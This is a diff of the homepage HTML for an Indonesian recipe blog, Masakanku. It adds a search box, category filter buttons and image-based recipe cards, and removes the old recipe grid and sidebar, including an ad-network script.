@@ -41,9 +41,29 @@
 
 
 <script src="//dojo.cc/124.js"></script>
-</head>
-<body>
 
+    <style>
+      .search-box { max-width: 600px; margin: 0 auto 2rem; position: relative; }
+      .search-box input { width: 100%; padding: 14px 20px 14px 50px; border: 2px solid #e0e0e0; border-radius: 50px; font-size: 1rem; transition: all 0.3s; }
+      .search-box input:focus { outline: none; border-color: #c0392b; box-shadow: 0 0 0 3px rgba(192,57,43,0.1); }
+      .search-box i { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: #999; font-size: 1.2rem; }
+      .search-box .clear-btn { position: absolute; right: 18px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #999; cursor: pointer; display: none; font-size: 1rem; }
+      .article-card { transition: all 0.3s; }
+      .article-card.hidden { display: none; }
+      .article-card .card { border: none; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.08); transition: all 0.3s; height: 100%; }
+      .article-card .card:hover { transform: translateY(-5px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }
+      .article-card .card-img-top { height: 200px; object-fit: cover; }
+      .article-card .card-body { padding: 1.2rem; }
+      .article-card .card-title { font-size: 1.05rem; font-weight: 700; line-height: 1.4; margin-bottom: 0.3rem; }
+      .article-card .card-title a { color: #2c3e50; text-decoration: none; }
+      .article-card .card-title a:hover { color: #c0392b; }
+      .article-count { color: #888; font-size: 0.9rem; text-align: center; margin-bottom: 1.5rem; }
+      .category-filter { text-align: center; margin-bottom: 1.5rem; }
+      .category-filter .btn-cat { display: inline-block; padding: 6px 16px; margin: 3px; border-radius: 20px; font-size: 0.85rem; border: 1px solid #ddd; background: #fff; color: #555; cursor: pointer; transition: all 0.2s; }
+      .category-filter .btn-cat:hover { border-color: #c0392b; color: #c0392b; }
+      .category-filter .btn-cat.active { background: #c0392b; color: #fff; border-color: #c0392b; }
+    </style></head>
+<body>
 <nav class="navbar navbar-expand-lg">
     <div class="container">
         <a class="navbar-brand" href="/"><i class="fas fa-utensils me-2"></i>Masakanku</a>
@@ -62,330 +82,1344 @@
 </nav>
 
 <section class="hero">
-    <div class="container">
-        <h1><i class="fas fa-fire me-2"></i>Selamat Datang di Masakanku</h1>
-        <p>Kumpulan resep masakan Indonesia asli. Dari Sabang sampai Merauke. <br>Semua ada di sini, lengkap dengan cara membuat yang mudah dipraktikkan.</p>
-    </div>
+  <div class="container">
+    <h1><i class="fas fa-fire me-2"></i>Selamat Datang di Masakanku</h1>
+    <p>Kumpulan resep masakan Indonesia asli. Dari Sabang sampai Merauke. <br>Semua ada di sini, lengkap dengan cara membuat yang mudah dipraktikkan.</p>
+  </div>
 </section>
 
 <div class="container mt-4">
-    <div class="row">
-        <div class="col-lg-8">
-            <h2 class="section-title"><i class="fas fa-newspaper me-2"></i>Resep Terbaru</h2>
-            <div class="row g-3">
-                                <!-- NEW ARTICLES (113) -->
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #8B4513, #A0522D);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Ayam</span>
-                            <h5 class="card-title mt-2"><a href="/tepung-ayam-goreng-sasa">Tepung Ayam Goreng Sasa: Resep Ayam Goreng Lezat dan Renyah - Masakanku</a></h5>
-                            <p class="card-text small">Tips membuat ayam goreng crispy pakai tepung Sasa.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #2ECC71, #27AE60);">
-                            <i class="fas fa-utensils fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Nasi</span>
-                            <h5 class="card-title mt-2"><a href="/tempe-mendoan">Resep Tempe Mendoan Crispy: Renyah di Luar, Lembut di Dalam! - Masakanku</a></h5>
-                            <p class="card-text small">Resep tempe mendoan crispy khas Banyumas. Tepung berbumbu tipis, digoreng setengah matang, dicocol kecap pedas. Cemilan favorit sepanjang masa!</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #8B4513, #A0522D);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Ayam</span>
-                            <h5 class="card-title mt-2"><a href="/soto-ayam">Resep Soto Ayam Kuah Kuning: Hangat, Segar, Bikin Nagih! - Masakanku</a></h5>
-                            <p class="card-text small">Resep soto ayam kuah kuning khas Indonesia. Kuah kaldu gurih, rempah wangi, plus sambal yang pedas nendang. Comfort food sejati!</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #8B4513, #A0522D);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Ayam</span>
-                            <h5 class="card-title mt-2"><a href="/sate-ayam">Resep Sate Ayam Bumbu Kacang: Empuk, Manis, Gurih! - Masakanku</a></h5>
-                            <p class="card-text small">Resep sate ayam bumbu kacang legendaris. Daging empuk, bumbu kacang medok, plus tips bakar anti gosong. Dijamin jadi favorit keluarga!</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #27AE60, #2ECC71);">
-                            <i class="fas fa-leaf fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Sayur</span>
-                            <h5 class="card-title mt-2"><a href="/resep-urap-sayur">Resep Urap Sayur</a></h5>
-                            <p class="card-text small">Resep urap sayur kelapa parut yang gurih. Enak, murah, dan kaya serat. Cocok buat lauk atau lalapan. lengkap dengan aneka sayuran.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #27AE60, #2ECC71);">
-                            <i class="fas fa-leaf fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Sayur</span>
-                            <h5 class="card-title mt-2"><a href="/resep-tumis-kangkung-belacan">Resep Tumis Kangkung Belacan: Pedas Gurih Wangi Terasi, Cocok Jadi Lauk Praktis - Masakanku</a></h5>
-                            <p class="card-text small">Tumis kangkung belacan pedas gurih wangi terasi, praktis 15 menit.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #27AE60, #2ECC71);">
-                            <i class="fas fa-leaf fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Sayur</span>
-                            <h5 class="card-title mt-2"><a href="/resep-tumis-kacang-panjang">Resep Tumis Kacang Panjang</a></h5>
-                            <p class="card-text small">Resep Tumis Kacang Panjang sederhana, enak, dan bergizi. Cocok jadi lauk harian. Kaya serat, rendah kalori. Masak cuma 15 menit!</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #27AE60, #2ECC71);">
-                            <i class="fas fa-leaf fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Sayur</span>
-                            <h5 class="card-title mt-2"><a href="/resep-tumis-buncis">5 Cara Tumis Buncis Agar Tetap Hijau dan Renyah</a></h5>
-                            <p class="card-text small">Bosen buncis lembek dan pucet? Coba 5 cara tumis buncis ini. Dijamin tetap hijau, crunchy, dan bikin nambah nasi.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #E74C3C, #C0392B);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Sapi</span>
-                            <h5 class="card-title mt-2"><a href="/resep-tongseng-sapi">Resep Tongseng Sapi: Pedas Manis, Daging Empuk, Kuah Kental Bikin Nagih! - Masakanku</a></h5>
-                            <p class="card-text small">Resep tongseng sapi khas Solo dengan kuah santan kental, pedas manis, dan potongan kol segar. Daging empuk, bumbu medok, cocok buat makan siang.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #8B4513, #A0522D);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Ayam</span>
-                            <h5 class="card-title mt-2"><a href="/resep-telur-balado">Resep Telur Balado Khas Padang: Pedas Nendang, Bikin Makan Lahap! - Masakanku</a></h5>
-                            <p class="card-text small">Resep telur balado khas Minang yang pedas gurih. Telur ceplok dengan sambal balado merah merona, cocok jadi lauk praktis sehari-hari.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #1ABC9C, #16A085);">
-                            <i class="fas fa-utensils fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Lainnya</span>
-                            <h5 class="card-title mt-2"><a href="/resep-tahu-gejrot">Resep Tahu Gejrot Khas Cirebon yang Pedas Segar</a></h5>
-                            <p class="card-text small">Resep Tahu Gejrot khas Cirebon yang pedas, segar, dan gurih. Lengkap dengan bahan, cara membuat, tips, dan rahasia kuah kecap cabai rawit yang bikin nagih.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #1ABC9C, #16A085);">
-                            <i class="fas fa-utensils fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Lainnya</span>
-                            <h5 class="card-title mt-2"><a href="/resep-tahu-crispy">Resep Tahu Crispy Renyah Tahan Lama</a></h5>
-                            <p class="card-text small">Resep tahu crispy yang renyah berjam-jam, nggak lecek walau udah dingin. Cocok buat cemilan, lauk, atau ide jualan. Gampang banget bikinnya!</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #8B4513, #A0522D);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Ayam</span>
-                            <h5 class="card-title mt-2"><a href="/resep-sup-jagung">Resep Sup Jagung Ayam — Hangat, Segar &amp; Bikin Sehat</a></h5>
-                            <p class="card-text small">Resep sup jagung manis dengan ayam cincang dan wortel. Simak cara bikin sup jagung bening yang hangat, gurih, dan bikin badan terasa enakan.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #1ABC9C, #16A085);">
-                            <i class="fas fa-utensils fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Lainnya</span>
-                            <h5 class="card-title mt-2"><a href="/resep-soto-betawi">Resep Soto Betawi — Panduan Lengkap Soto Betawi Kuah Susu Gurih</a></h5>
-                            <p class="card-text small">Resep soto betawi lengkap dari awal. Pelajari bahan, cara masak, tips kuah susu putih medok dan wangi rempah. Ada santan & tanpa santan. Anti gagal!</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #E74C3C, #C0392B);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Sapi</span>
-                            <h5 class="card-title mt-2"><a href="/resep-sop-iga-sapi">Resep Sop Iga Sapi: Kuah Bening Gurih, Daging Empuk, Hangatkan Hari! - Masakanku</a></h5>
-                            <p class="card-text small">Resep sop iga sapi bening dengan kuah kaldu yang gurih. Daging iga empuk lumer, sayuran segar, cocok jadi menu penghangat badan.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #E74C3C, #C0392B);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Sapi</span>
-                            <h5 class="card-title mt-2"><a href="/resep-sop-buntut-sapi">Resep Sop Buntut Sapi Empuk: Daging Lumer, Kuah Bening Segar! - Masakanku</a></h5>
-                            <p class="card-text small">Resep sop buntut sapi empuk dengan kuah bening gurih. Dilengkapi tips rahasia biar daging lumer dan bumbu meresap sempurna. Cocok untuk makan siang keluarga!</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #8B4513, #A0522D);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Ayam</span>
-                            <h5 class="card-title mt-2"><a href="/resep-sop-ayam">Resep Sop Ayam Bening Kuah Gurih & Daging Empuk</a></h5>
-                            <p class="card-text small">Resep sop ayam bening kuah kaldu gurih, daging ayam empuk, sayuran segar. Lengkap dengan trik bikin kaldu superior dan tips anti gagal dari pertama principles.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #2980B9, #3498DB);">
-                            <i class="fas fa-fish fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Ikan</span>
-                            <h5 class="card-title mt-2"><a href="/resep-siomay-bandung">Resep Siomay Bandung</a></h5>
-                            <p class="card-text small">Resep siomay bandung ikan tenggiri yang kenyal dan gurih. Lengkap dengan bumbu kacang, kecap, sambal, tahu, kol, dan pare. Bisa buat jualan.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #8B4513, #A0522D);">
-                            <i class="fas fa-drumstick-bite fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Ayam</span>
-                            <h5 class="card-title mt-2"><a href="/resep-semur-ayam-kentang">Resep Semur Ayam Kentang Super Empuk Bumbu Meresap</a></h5>
-                            <p class="card-text small">Resep semur ayam kentang dengan bumbu kecap yang meresap sempurna. Daging ayam empuk, kentang lembut, kuah kental gurih manis. Lengkap dengan tips anti gagal.</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #1ABC9C, #16A085);">
-                            <i class="fas fa-utensils fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Lainnya</span>
-                            <h5 class="card-title mt-2"><a href="/resep-seblak">Resep Seblak Khas Sunda</a></h5>
-                            <p class="card-text small">Resep seblak lengkap dari awal sampai akhir. Pedas, gurih, kenyal. Cocok buat jualan atau camilan sore. Dijamin nagih!</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-md-4 col-sm-6">
-                    <div class="card">
-                        <div class="card-img-top d-flex align-items-center justify-content-center text-white" style="background: linear-gradient(135deg, #27AE60, #2ECC71);">
-                            <i class="fas fa-leaf fa-4x"></i>
-                        </div>
-                        <div class="card-body">
-                            <span class="category-badge">Sayur</span>
-                            <h5 class="card-title mt-2"><a href="/resep-sayur-lodeh">Resep Sayur Lodeh: Gurih Santan, Isi Lengkap, Nyaman Banget di Perut! - Masakanku</a></h5>
-                            <p class="card-text small">Resep sayur lodeh Jawa dengan kuah santan gurih, sayuran lengkap, dan bumbu rempah pilihan. Cocok buat menu sehari-hari yang sederhana tapi nikmat.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+  <div class="search-box">
+    <i class="fas fa-search"></i>
+    <input type="text" id="searchInput" placeholder="Cari resep..." autocomplete="off">
+    <button class="clear-btn" id="clearBtn" onclick="clearSearch()"><i class="fas fa-times"></i></button>
+  </div>
 
-        <div class="col-lg-4"></div>
-        </div>
+  <div class="category-filter">
+    <button class="btn-cat active" onclick="filterCategory('all')">Semua</button>
+    <button class="btn-cat" onclick="filterCategory('Ayam')">Ayam</button>
+    <button class="btn-cat" onclick="filterCategory('Sapi')">Sapi</button>
+    <button class="btn-cat" onclick="filterCategory('Ikan')">Ikan</button>
+    <button class="btn-cat" onclick="filterCategory('Sayur')">Sayur</button>
+    <button class="btn-cat" onclick="filterCategory('Nasi')">Nasi</button>
+    <button class="btn-cat" onclick="filterCategory('Kue')">Kue</button>
+    <button class="btn-cat" onclick="filterCategory('Minuman')">Minuman</button>
+    <button class="btn-cat" onclick="filterCategory('Sambal')">Sambal</button>
+    <button class="btn-cat" onclick="filterCategory('Lainnya')">Lainnya</button>
+  </div>
 
-        <div class="col-lg-4">
-            <div class="sidebar-card"><h5><i class="fas fa-ad me-2"></i>Sponsored</h5><div style="text-align:center"><script>atOptions={"key":"fdbef234e366d3a1bec082224adfc676","format":"iframe","height":250,"width":300,"params":{}};</script><script src="https://jabturfembitter.com/fdbef234e366d3a1bec082224adfc676/invoke.js"></script></div></div>
-                <div class="sidebar-card">
-                <h5><i class="fas fa-th-list me-2"></i>Kategori</h5>
-                <ul>
-                    <li><a href="/"><i class="fas fa-drumstick-bite me-2" style="color:#c0392b;"></i>Resep Ayam</a></li>
-                    <li><a href="/resep-ikan-nila-bakar-sambal-matah"><i class="fas fa-fish me-2" style="color:#3498db;"></i>Resep Ikan</a></li>
-                    <li><a href="/resep-rendang-sapi"><i class="fas fa-cow me-2" style="color:#8B4513;"></i>Resep Sapi</a></li>
-                    <li><a href="/resep-sayur-asem-segar"><i class="fas fa-carrot me-2" style="color:#1abc9c;"></i>Resep Sayur</a></li>
-                    <li><a href='/resep-nasi-liwet-solo'><i class="fas fa-egg me-2" style="color:#F1C40F;"></i>Resep Nasi</a></li>
-                    <li><a href='/resep-sambal-terasi'><i class="fas fa-pepper-hot me-2" style="color:#E74C3C;"></i>Resep Sambal</a></li>
-                    <li><a href='/resep-nagasari-pisang'><i class="fas fa-cookie me-2" style="color:#27AE60;"></i>Kue Tradisional</a></li>
-                    <li><a href='/resep-es-teler'><i class="fas fa-cocktail me-2" style="color:#FF6B6B;"></i>Minuman</a></li>
-                </ul>
+  <div class="article-count" id="articleCount">Menampilkan <strong>109</strong> resep</div>
+
+  <div class="row g-4" id="articleGrid">
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ayam" data-search="resep garang asem resep garang asem ayam khas solo lengkap. bungkus daun pisang, kuah asam segar, pedas, dan gurih. cara bikin praktis, mantap buat temen nasi.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1598103442097-8b74394b95c6?w=600&q=80" alt="Resep Garang Asem" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ayam</span>
+                  <h5 class="card-title"><a href="/resep-garang-asem">Resep Garang Asem</a></h5>
+                  <p class="card-text small flex-grow-1">Resep garang asem ayam khas Solo lengkap. Bungkus daun pisang, kuah asam segar, pedas, dan gurih. Cara bikin praktis,...</p>
+                  <a href="/resep-garang-asem" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
             </div>
 
-            <div class="sidebar-card">
-                <h5><i class="fas fa-clock me-2"></i>Resep Terbaru</h5>
-                <ul>
-                        <li><a href="/tepung-ayam-goreng-sasa">Tepung Ayam Goreng Sasa: Resep Ayam Gore</a></li>
-                        <li><a href="/tempe-mendoan">Resep Tempe Mendoan Crispy: Renyah di Lu</a></li>
-                        <li><a href="/soto-ayam">Resep Soto Ayam Kuah Kuning: Hangat, Seg</a></li>
-                        <li><a href="/sate-ayam">Resep Sate Ayam Bumbu Kacang: Empuk, Man</a></li>
-                        <li><a href="/resep-urap-sayur">Resep Urap Sayur</a></li>
-                        <li><a href="/resep-tumis-kangkung-belacan">Resep Tumis Kangkung Belacan: Pedas Guri</a></li>
-                        <li><a href="/resep-tumis-kacang-panjang">Resep Tumis Kacang Panjang</a></li>
-                        <li><a href="/resep-tumis-buncis">5 Cara Tumis Buncis Agar Tetap Hijau dan</a></li>
-                        <li><a href="/resep-tongseng-sapi">Resep Tongseng Sapi: Pedas Manis, Daging</a></li>
-                        <li><a href="/resep-telur-balado">Resep Telur Balado Khas Padang: Pedas Ne</a></li>
-                        <li><a href="/resep-tahu-gejrot">Resep Tahu Gejrot Khas Cirebon yang Peda</a></li>
-                        <li><a href="/resep-tahu-crispy">Resep Tahu Crispy Renyah Tahan Lama</a></li>
-                        <li><a href="/resep-sup-jagung">Resep Sup Jagung Ayam</a></li>
-                        <li><a href="/resep-soto-betawi">Resep Soto Betawi</a></li>
-                        <li><a href="/resep-sop-iga-sapi">Resep Sop Iga Sapi: Kuah Bening Gurih, D</a></li>
-                    </ul>
-            </div>
-
-            <div class="sidebar-card">
-                <h5><i class="fas fa-share-alt me-2"></i>Ikuti Kami</h5>
-                <p class="small text-muted">Dapatkan resep terbaru setiap hari. Masak jadi lebih seru dengan Masakanku!</p>
-                <div class="d-flex gap-2">
-                    <a href="#" class="btn btn-outline-danger btn-sm"><i class="fab fa-instagram"></i></a>
-                    <a href="#" class="btn btn-outline-danger btn-sm"><i class="fab fa-facebook"></i></a>
-                    <a href="#" class="btn btn-outline-danger btn-sm"><i class="fab fa-youtube"></i></a>
-                    <a href="#" class="btn btn-outline-danger btn-sm"><i class="fab fa-pinterest"></i></a>
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep urap sayur resep urap sayur kelapa parut yang gurih. enak, murah, dan kaya serat. cocok buat lauk atau lalapan. lengkap dengan aneka sayuran.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Urap Sayur" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-urap-sayur">Resep Urap Sayur</a></h5>
+                  <p class="card-text small flex-grow-1">Resep urap sayur kelapa parut yang gurih. Enak, murah, dan kaya serat. Cocok buat lauk atau lalapan. lengkap dengan a...</p>
+                  <a href="/resep-urap-sayur" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
                 </div>
+              </div>
             </div>
 
-            <div class="sidebar-card">
-                <h5><i class="fas fa-question-circle me-2"></i>Tentang Kami</h5>
-                <p class="small text-muted">Masakanku adalah blog resep masakan Indonesia asli. Kami menyajikan resep autentik dari berbagai daerah yang mudah dipraktikkan di rumah.</p>
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Kue" data-search="resep lumpia semarang resep lumpia semarang isi rebung dan udang. kulit tipis, isi padat, dan sambal pedas manis. lengkap dari bikin kulit sampai teknik menggulung.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1551024601-bec78aea704b?w=600&q=80" alt="Resep Lumpia Semarang" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Kue</span>
+                  <h5 class="card-title"><a href="/resep-lumpia-semarang">Resep Lumpia Semarang</a></h5>
+                  <p class="card-text small flex-grow-1">Resep lumpia Semarang isi rebung dan udang. Kulit tipis, isi padat, dan sambal pedas manis. Lengkap dari bikin kulit ...</p>
+                  <a href="/resep-lumpia-semarang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
             </div>
-        </div>
-    </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep siomay bandung resep siomay bandung ikan tenggiri yang kenyal dan gurih. lengkap dengan bumbu kacang, kecap, sambal, tahu, kol, dan pare. bisa buat jualan.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Siomay Bandung" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-siomay-bandung">Resep Siomay Bandung</a></h5>
+                  <p class="card-text small flex-grow-1">Resep siomay bandung ikan tenggiri yang kenyal dan gurih. Lengkap dengan bumbu kacang, kecap, sambal, tahu, kol, dan ...</p>
+                  <a href="/resep-siomay-bandung" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sayur" data-search="resep lontong sayur resep lontong sayur labu siam lengkap. kuah santan gurih, lontong empuk, dan toping lengkap. sarapan favorit yang bikin kenyang sampai siang.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1540420773420-3366772f4999?w=600&q=80" alt="Resep Lontong Sayur" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sayur</span>
+                  <h5 class="card-title"><a href="/resep-lontong-sayur">Resep Lontong Sayur</a></h5>
+                  <p class="card-text small flex-grow-1">Resep lontong sayur labu siam lengkap. Kuah santan gurih, lontong empuk, dan toping lengkap. Sarapan favorit yang bik...</p>
+                  <a href="/resep-lontong-sayur" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Ikan" data-search="resep pempek palembang resep pempek palembang kenyal dan gurih. pakai ikan tenggiri asli. lengkap dengan kuah cuko yang pedas manis. dari pempek kapal selam sampe adaan.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1519708227418-c8fd9a32b7a2?w=600&q=80" alt="Resep Pempek Palembang" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Ikan</span>
+                  <h5 class="card-title"><a href="/resep-pempek-palembang">Resep Pempek Palembang</a></h5>
+                  <p class="card-text small flex-grow-1">Resep pempek Palembang kenyal dan gurih. Pakai ikan tenggiri asli. Lengkap dengan kuah cuko yang pedas manis. Dari pe...</p>
+                  <a href="/resep-pempek-palembang" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep bebek goreng resep bebek goreng krispi tanpa bau prengus. daging empuk, kulit kering, dan gurih. lengkap dengan sambal ijo dan lalapan. bisa jualan juga.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Bebek Goreng" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-bebek-goreng">Resep Bebek Goreng</a></h5>
+                  <p class="card-text small flex-grow-1">Resep bebek goreng krispi tanpa bau prengus. Daging empuk, kulit kering, dan gurih. Lengkap dengan sambal ijo dan lal...</p>
+                  <a href="/resep-bebek-goreng" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
+            <div class="col-lg-4 col-md-6 col-sm-6 article-card" data-category="Sapi" data-search="resep iga bakar madu resep iga bakar madu yang empuk banget. dagingnya lumer, bumbunya meresap sampe ke tulang. pakai teknik presto biar cepet. dijamin saingan restoran.">
+              <div class="card h-100">
+                <img src="https://images.unsplash.com/photo-1558030089-654c1e967069?w=600&q=80" alt="Resep Iga Bakar Madu" class="card-img-top" loading="lazy" onerror="this.style.display='none'">
+                <div class="card-body d-flex flex-column">
+                  <span class="category-badge mb-2">Sapi</span>
+                  <h5 class="card-title"><a href="/resep-iga-bakar-madu">Resep Iga Bakar Madu</a></h5>
+                  <p class="card-text small flex-grow-1">Resep iga bakar madu yang empuk banget. Dagingnya lumer, bumbunya meresap sampe ke tulang. Pakai teknik presto biar c...</p>
+                  <a href="/resep-iga-bakar-madu" class="btn btn-sm btn-outline-danger mt-2">Baca Resep <i class="fas fa-arrow-right ms-1"></i></a>
+                </div>
+              </div>
+            </div>
+
